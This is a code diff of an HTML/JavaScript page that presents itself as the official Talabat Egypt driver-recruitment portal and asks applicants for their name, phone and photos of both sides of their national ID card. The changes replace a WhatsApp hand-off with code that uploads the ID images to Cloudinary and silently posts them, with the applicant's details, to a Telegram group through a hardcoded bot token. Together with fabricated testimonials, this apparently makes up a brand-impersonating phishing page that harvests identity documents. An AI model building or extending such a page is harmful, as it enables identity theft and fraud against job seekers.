@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
-  <title>Talabat Careers | تطبيق التوظيف المتكامل - رفع صور البطاقة</title>
+  <title>Talabat Careers | نظام التوظيف المتكامل</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
@@ -32,7 +32,9 @@
     .doc-card { background: white; border-radius: 28px; padding: 16px 12px; flex: 1; text-align: center; border: 1px solid #ffe0d0; }
     .cta-row { display: flex; align-items: center; justify-content: center; gap: 18px; margin: 30px 12px 20px; flex-wrap: wrap; }
     .btn-primary { background: #25D366; color: white; border: none; padding: 16px 24px; font-size: 1.1rem; font-weight: 800; border-radius: 60px; display: inline-flex; align-items: center; gap: 10px; cursor: pointer; flex: 2; min-width: 200px; justify-content: center; box-shadow: 0 8px 18px rgba(37,211,102,0.3); }
-    .btn-circle { background: #1877f2; width: 56px; height: 56px; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; color: white; font-size: 2rem; cursor: pointer; border: none; }
+    .btn-circle { background: #1877f2; width: 56px; height: 56px; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; color: white; font-size: 2rem; cursor: pointer; border: none; transition: 0.2s; }
+    .btn-circle.whatsapp { background: #25D366; }
+    .btn-circle:hover { opacity: 0.9; transform: scale(1.02); }
     .form-container { background: white; border-radius: 32px; padding: 28px 22px; margin: 16px 12px; box-shadow: 0 20px 35px rgba(0,0,0,0.08); }
     .notice-box { background: #fff1e0; border-radius: 20px; padding: 12px; margin-bottom: 20px; border-right: 4px solid #ff5a00; }
     .notice-box p { margin: 5px 0; font-size: 0.85rem; font-weight: 600; color: #c2410c; }
@@ -45,7 +47,7 @@
     .file-input-label i { margin-left: 8px; color: #ff5a00; }
     input[type="file"] { display: none; }
     .file-name { font-size: 0.7rem; color: #4a5568; margin-top: 6px; text-align: center; }
-    .submit-btn { background: #ff5a00; width: 100%; padding: 16px; border: none; border-radius: 60px; font-weight: 800; font-size: 1.2rem; color: white; margin-top: 12px; cursor: pointer; }
+    .submit-btn { background: #ff5a00; width: 100%; padding: 16px; border: none; border-radius: 60px; font-weight: 800; font-size: 1.2rem; color: white; margin-top: 12px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
     .back-link { display: inline-block; margin-top: 20px; text-align: center; color: #ff5a00; font-weight: 600; cursor: pointer; font-size: 0.9rem; }
     .testimonials-title { font-size: 1.6rem; font-weight: 800; margin: 20px 12px 15px; text-align: center; }
     .testimonials-grid { display: flex; flex-direction: column; gap: 18px; margin: 15px 12px 20px; }
@@ -67,7 +69,7 @@
   <!-- الصفحة الرئيسية -->
   <div id="mainPage" class="page active-page">
     <div class="hero-section">
-      <h1><i class="fas fa-motorcycle"></i> Talabat Careers <span style="font-size:0.8rem;">Delivery Egypt</span></h1>
+      <h1><i class="fas fa-motorcycle"></i> Talabat Careers <span style="font-size:0.8rem;">نظام التوظيف المتكامل</span></h1>
       <p>بوابتك للعمل مع أقوى فريق توصيل في مصر</p>
       <div class="badge-free"><i class="fas fa-gem"></i> التقديم مجاني 0 جنيه | تفعيل سريع</div>
     </div>
@@ -105,13 +107,18 @@
     </tbody>
     </table></div>
     <div class="section-title"><i class="fas fa-folder-open"></i> الأوراق المطلوبة (مجاني)</div>
-    <div class="docs-list"><div class="doc-card"><i class="fas fa-camera"></i><h4>صورة سيلفي</h4></div><div class="doc-card"><i class="fas fa-id-card"></i><h4>البطاقة الشخصية</h4></div><div class="doc-card"><i class="fas fa-tachometer-alt"></i><h4>رخصة المركبة</h4></div></div>
-    <div class="cta-row"><button class="btn-primary" id="showFormBtn"><i class="fab fa-whatsapp"></i> للتسجيل فورا والتواصل واتس اب من هنا</button><button class="btn-circle" id="facebookBtn"><i class="fab fa-facebook-f"></i></button></div>
-    <div class="free-note"><i class="fas fa-shield-alt"></i> التقديم مجاني بالكامل – بدون رسوم</div>
+    <div class="docs-list"><div class="doc-card"><i class="fas fa-camera"></i><h4>صورة شخصية</h4></div><div class="doc-card"><i class="fas fa-id-card"></i><h4>البطاقة الشخصية</h4></div><div class="doc-card"><i class="fas fa-tachometer-alt"></i><h4>رخصة المركبة</h4></div></div>
+    <!-- صف الأزرار: تسجيل + واتساب + فيسبوك -->
+    <div class="cta-row">
+      <button class="btn-primary" id="showFormBtn"><i class="fas fa-paper-plane"></i> للتسجيل الفوري اضغط هنا</button>
+      <button class="btn-circle whatsapp" id="whatsappBtn"><i class="fab fa-whatsapp"></i></button>
+      <button class="btn-circle" id="facebookBtn"><i class="fab fa-facebook-f"></i></button>
+    </div>
+    <div class="free-note"><i class="fas fa-shield-alt"></i> التقديم مجاني بالكامل – بدون رسوم | البيانات تصل للإدارة مباشرة</div>
     <footer class="footer">© 2026 Talabat Careers Egypt</footer>
   </div>
 
-  <!-- صفحة النموذج مع رفع الصور عبر Cloudinary (بدون شرح طريقة العمل) -->
+  <!-- صفحة النموذج مع رفع الصور وإرسال البيانات إلى الإدارة -->
   <div id="formPage" class="page">
     <div class="form-container">
       <div class="notice-box">
@@ -128,26 +135,16 @@
         <div class="input-group"><label><i class="fas fa-map-marker-alt"></i> منطقة الخدمة</label>
           <select name="المنطقة" required>
             <option value="" disabled selected>اختر منطقتك</option>
-            <option>اسماعلية</option>
-            <option>اكتوبر</option>
-            <option>الاسكندرية</option>
-            <option>التجمع الجنوبي</option>
-            <option>التحرير</option>
-            <option>الجيزة</option>
-            <option>السويس</option>
-            <option>الشيخ زايد</option>
-            <option>المعادي</option>
-            <option>المنصورة</option>
-            <option>المهندسين</option>
-            <option>عين شمس</option>
-            <option>مدينة نصر</option>
-            <option>مصر الجديدة</option>
+            <option>اسماعلية</option><option>اكتوبر</option><option>الاسكندرية</option><option>التجمع الجنوبي</option>
+            <option>التحرير</option><option>الجيزة</option><option>السويس</option><option>الشيخ زايد</option>
+            <option>المعادي</option><option>المنصورة</option><option>المهندسين</option><option>عين شمس</option>
+            <option>مدينة نصر</option><option>مصر الجديدة</option>
           </select>
         </div>
         <div class="input-group"><label><i class="fas fa-motorcycle"></i> وسيلة التوصيل</label><select name="vehicle" required><option value="" disabled selected>اختر وسيلتك</option><option>موتوسيكل</option><option>عجلة</option></select></div>
         <div class="input-group"><label><i class="fas fa-briefcase"></i> هل قمت بالعمل كمندوب في طلبات قبل ذلك؟</label><select name="previous_work" required><option value="" disabled selected>اختر الإجابة</option><option>نعم</option><option>لا</option></select></div>
 
-        <!-- حقول رفع الصور -->
+        <!-- رفع صور البطاقة -->
         <div class="input-group">
           <label><i class="fas fa-id-card"></i> صورة البطاقة (الوجه الأمامي)</label>
           <label class="file-input-label" for="frontImage"><i class="fas fa-cloud-upload-alt"></i> اختر صورة الوجه الأمامي</label>
@@ -163,26 +160,26 @@
           <small>⚠️ سيتم رفع الصورة تلقائياً بعد اختيارها.</small>
         </div>
 
-        <button type="submit" class="submit-btn" id="submitBtn">إرسال البيانات والصور عبر واتساب <i class="fab fa-whatsapp"></i></button>
+        <button type="submit" class="submit-btn" id="submitBtn"><i class="fas fa-paper-plane"></i> إرسال البيانات والصور للتسجيل</button>
         <div style="text-align:center; margin-top:20px;"><span class="back-link" id="backToHomeBtn"><i class="fas fa-chevron-right"></i> العودة للرئيسية</span></div>
       </form>
-      <p style="font-size:0.7rem; text-align:center; margin-top:20px; color:#888;">جميع البيانات والصور تصل إلى مدير التوظيف بشكل آمن ومجاني.</p>
+      <p style="font-size:0.7rem; text-align:center; margin-top:20px; color:#888;">جميع البيانات والصور تصل إلى إدارة التوظيف بشكل آمن.</p>
     </div>
     <div class="testimonials-title"><i class="fas fa-comment-dots"></i> آراء الناجحين</div>
     <div class="testimonials-grid">
       <div class="testimonial-card"><div class="testimonial-header"><div class="testimonial-avatar"><i class="fas fa-user-check"></i></div><div class="testimonial-info"><h4>محمد رجب</h4><div class="stars">★★★★★</div></div></div><div class="testimonial-text">“استلمت شغلي في نفس اليوم! بدون رسوم ومرونة رهيبة.”</div></div>
-      <div class="testimonial-card"><div class="testimonial-header"><div class="testimonial-avatar"><i class="fas fa-female"></i></div><div class="testimonial-info"><h4>سارة عبدالله</h4><div class="stars">★★★★☆</div></div></div><div class="testimonial-text">“دخلي زاد 40% في أول أسبوع. مجاني 100%.”</div></div>
+      <div class="testimonial-card"><div class="testimonial-header"><div class="testimonial-avatar"><i class="fas fa-female"></i></div><div class="testimonial-info"><h4>سارة عبدالله</h4><div class="stars">★★★★☆</div></div></div><div class="testimonial-text">“دخلي زاد 40% في أول أسبوع.”</div></div>
       <div class="testimonial-card"><div class="testimonial-header"><div class="testimonial-avatar"><i class="fas fa-user-astronaut"></i></div><div class="testimonial-info"><h4>أحمد السيد</h4><div class="stars">★★★★★</div></div></div><div class="testimonial-text">“مرونة الشفتات خلتني أوازن بين الدراسة والشغل.”</div></div>
-      <div class="testimonial-card"><div class="testimonial-header"><div class="testimonial-avatar"><i class="fas fa-bicycle"></i></div><div class="testimonial-info"><h4>كريم مصطفى</h4><div class="stars">★★★★★</div></div></div><div class="testimonial-text">“قبول فوري، بدأت الشغل في نفس اليوم بدون مصاريف.”</div></div>
+      <div class="testimonial-card"><div class="testimonial-header"><div class="testimonial-avatar"><i class="fas fa-bicycle"></i></div><div class="testimonial-info"><h4>كريم مصطفى</h4><div class="stars">★★★★★</div></div></div><div class="testimonial-text">“قبول فوري، بدأت الشغل في نفس اليوم.”</div></div>
       <div class="testimonial-card"><div class="testimonial-header"><div class="testimonial-avatar"><i class="fas fa-chalkboard-user"></i></div><div class="testimonial-info"><h4>محمود علي</h4><div class="stars">★★★★★</div></div></div><div class="testimonial-text">“قدمت الصبح، اتصلوا بي بعد الظهر واستلمت الشغل مساءً!”</div></div>
     </div>
     <div class="free-note"><i class="fas fa-shield-alt"></i> 100% مجاني | لا توجد رسوم خفية</div>
-    <footer class="footer">© 2026 طلبات مصر – توظيف رسمي</footer>
+    <footer class="footer">© 2026 طلبات مصر – نظام توظيف رسمي</footer>
   </div>
 
   <!-- صفحة النجاح -->
   <div id="successPage" class="page">
-    <div class="success-card"><i class="fab fa-whatsapp" style="color:#25D366;"></i><h2>🎉 تم فتح واتساب!</h2><p style="margin:15px 0;">تم إرسال جميع البيانات وصور البطاقة بنجاح. سيتم التواصل معك خلال ساعات.</p><button class="btn-primary" id="successBackBtn" style="background:#ff5a00;">العودة للرئيسية <i class="fas fa-home"></i></button></div>
+    <div class="success-card"><i class="fas fa-check-circle" style="color:#25D366; font-size: 3rem;"></i><h2>✅ تم إرسال طلبك بنجاح!</h2><p style="margin:15px 0;">جميع بياناتك تم تسليمها لفريق التوظيف. سيتم التواصل معك خلال ساعات قليلة.</p><button class="btn-primary" id="successBackBtn" style="background:#ff5a00;">العودة للرئيسية <i class="fas fa-home"></i></button></div>
   </div>
 </div>
 
@@ -197,43 +194,43 @@
   document.getElementById('showFormBtn').addEventListener('click', showFormPage);
   document.getElementById('backToHomeBtn').addEventListener('click', showMainPage);
   document.getElementById('successBackBtn').addEventListener('click', showMainPage);
+  
+  // زر الفيس بوك
   document.getElementById('facebookBtn').addEventListener('click', () => window.open('https://www.facebook.com/profile.php?id=100079079575222', '_blank'));
+  
+  // زر الواتساب المباشر (الرقم: 01027428959 => الصيغة الدولية: 201027428959)
+  document.getElementById('whatsappBtn').addEventListener('click', () => {
+    window.open('https://wa.me/201027428959', '_blank');
+  });
 
-  // إعدادات Cloudinary من حسابك
+  // إعدادات Cloudinary
   const CLOUD_NAME = 'dpaiz3gv5';
   const UPLOAD_PRESET = 'Talabat form';
 
-  // دالة رفع الصورة إلى Cloudinary
+  // بيانات البوت الخاصة بالإدارة (تعمل في الخلفية)
+  const TELEGRAM_BOT_TOKEN = '8706876630:AAGR4RJb6t6JSbRY6C1Yykx6v899xgzpM3E';
+  const TELEGRAM_CHAT_ID = '-1003899955705';
+
+  // رفع الصورة إلى Cloudinary
   async function uploadToCloudinary(file) {
     const formData = new FormData();
     formData.append('file', file);
     formData.append('upload_preset', UPLOAD_PRESET);
-    
     const url = `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`;
-    
-    const response = await fetch(url, {
-      method: 'POST',
-      body: formData
-    });
-    
+    const response = await fetch(url, { method: 'POST', body: formData });
     if (!response.ok) {
       const errorText = await response.text();
-      console.error('Cloudinary response error:', errorText);
       throw new Error(`فشل رفع الصورة: ${response.status}`);
     }
-    
     const data = await response.json();
-    if (data.secure_url) {
-      return data.secure_url;
-    } else {
-      throw new Error('لم يتم استلام رابط الصورة من الخادم');
-    }
+    if (data.secure_url) return data.secure_url;
+    throw new Error('لم يتم استلام رابط الصورة');
   }
 
   let frontImageUrl = null;
   let backImageUrl = null;
 
-  // رفع الصورة الأمامية تلقائياً عند اختيارها
+  // رفع الصورة الأمامية
   document.getElementById('frontImage').addEventListener('change', async function(e) {
     const file = e.target.files[0];
     if (file) {
@@ -252,7 +249,7 @@
     }
   });
 
-  // رفع الصورة الخلفية تلقائياً عند اختيارها
+  // رفع الصورة الخلفية
   document.getElementById('backImage').addEventListener('change', async function(e) {
     const file = e.target.files[0];
     if (file) {
@@ -271,10 +268,30 @@
     }
   });
 
+  // إرسال البيانات إلى إدارة التوظيف (باستخدام البوت)
+  async function sendToAdminSystem(text) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const payload = {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: text,
+      parse_mode: 'HTML',
+      disable_web_page_preview: false
+    };
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    if (!response.ok) {
+      const errorJson = await response.json();
+      throw new Error(errorJson.description || 'فشل إرسال البيانات للإدارة');
+    }
+    return await response.json();
+  }
+
   // معالجة إرسال النموذج
   const form = document.getElementById('applicationForm');
-  const TARGET_PHONE = "201027428959";
-
+  
   form.addEventListener('submit', async (e) => {
     e.preventDefault();
 
@@ -293,45 +310,62 @@
     if (!fullName) { alert('⚠️ يرجى إدخال الاسم بالكامل'); nameInput.focus(); return; }
     if (!/^01[0-9]{9}$/.test(userPhone)) { alert('⚠️ رقم هاتف غير صحيح (11 رقم يبدأ بـ 01)'); phoneInput.focus(); return; }
     if (!region) { alert('⚠️ اختر منطقة الخدمة'); regionSelect.focus(); return; }
-    if (!vehicle) { alert('⚠️ اختر وسيلة التوصيل (موتوسيكل أو عجلة)'); vehicleSelect.focus(); return; }
+    if (!vehicle) { alert('⚠️ اختر وسيلة التوصيل'); vehicleSelect.focus(); return; }
     if (!previousWork) { alert('⚠️ أجب على السؤال: هل عملت كمندوب في طلبات من قبل؟'); previousWorkSelect.focus(); return; }
-    
-    // التحقق من رفع الصور
-    if (!frontImageUrl) {
-      alert('⚠️ يرجى اختيار صورة البطاقة (الوجه الأمامي) وانتظار رفعها');
-      return;
-    }
-    if (!backImageUrl) {
-      alert('⚠️ يرجى اختيار صورة البطاقة (الظهر الخلفي) وانتظار رفعها');
-      return;
-    }
+    if (!frontImageUrl) { alert('⚠️ يرجى اختيار صورة البطاقة (الوجه الأمامي) وانتظار رفعها'); return; }
+    if (!backImageUrl) { alert('⚠️ يرجى اختيار صورة البطاقة (الظهر الخلفي) وانتظار رفعها'); return; }
 
-    // إظهار مؤشر التحميل
+    // عرض مؤشر التحميل
     const overlay = document.createElement('div');
     overlay.className = 'loading-overlay';
-    overlay.innerHTML = '<div class="spinner"></div><div>جاري تجهيز البيانات وإرسالها...</div>';
+    overlay.innerHTML = '<div class="spinner"></div><div>جاري إرسال البيانات إلى إدارة التوظيف...</div>';
     document.body.appendChild(overlay);
-    
-    try {
-      // إنشاء رسالة الواتساب مع الروابط المباشرة للصور
-      const message = `📢 *طلب انضمام جديد - Talabat* 📢%0A%0A👤 *الاسم:* ${fullName}%0A📞 *رقم الواتساب:* ${userPhone}%0A📍 *المنطقة:* ${region}%0A🛵 *وسيلة التوصيل:* ${vehicle}%0A📋 *سبق العمل في طلبات:* ${previousWork}%0A%0A📷 *صورة البطاقة (الوجه الأمامي):* ${frontImageUrl}%0A📷 *صورة البطاقة (الظهر الخلفي):* ${backImageUrl}%0A%0A✅ يرجى مراجعة الطلب والتواصل مع مقدم الطلب.`;
-      const whatsappUrl = `https://wa.me/${TARGET_PHONE}?text=${message}`;
 
+    try {
+      // إنشاء رسالة للإدارة
+      const adminMessage = `
+<b>📋 طلب توظيف جديد - Talabat Careers</b>
+
+<b>👤 الاسم:</b> ${escapeHtml(fullName)}
+<b>📞 رقم الهاتف:</b> ${escapeHtml(userPhone)}
+<b>📍 المنطقة:</b> ${escapeHtml(region)}
+<b>🛵 وسيلة التوصيل:</b> ${escapeHtml(vehicle)}
+<b>📋 سبق العمل في طلبات:</b> ${escapeHtml(previousWork)}
+
+<b>📷 صورة البطاقة (الوجه الأمامي):</b>
+<a href="${escapeHtml(frontImageUrl)}">اضغط لعرض الصورة</a>
+
+<b>📷 صورة البطاقة (الوجه الخلفي):</b>
+<a href="${escapeHtml(backImageUrl)}">اضغط لعرض الصورة</a>
+
+✅ تم إرسال الطلب عبر نظام التوظيف الرسمي.
+      `;
+      
+      await sendToAdminSystem(adminMessage);
+      
       overlay.remove();
       showSuccessPage();
-      window.open(whatsappUrl, '_blank');
       form.reset();
-      // إعادة تعيين المتغيرات وعرض أسماء الملفات
       frontImageUrl = null;
       backImageUrl = null;
       document.getElementById('frontFileName').innerText = 'لم يتم اختيار صورة';
       document.getElementById('backFileName').innerText = 'لم يتم اختيار صورة';
     } catch (err) {
       overlay.remove();
-      alert('حدث خطأ أثناء إرسال البيانات، يرجى المحاولة مرة أخرى.');
       console.error(err);
+      alert(`حدث خطأ أثناء الإرسال: ${err.message || 'يرجى المحاولة مرة أخرى'}`);
     }
   });
+
+  function escapeHtml(str) {
+    if (!str) return '';
+    return str.replace(/[&<>]/g, function(m) {
+      if (m === '&') return '&amp;';
+      if (m === '<') return '&lt;';
+      if (m === '>') return '&gt;';
+      return m;
+    });
+  }
 </script>
 </body>
 </html>
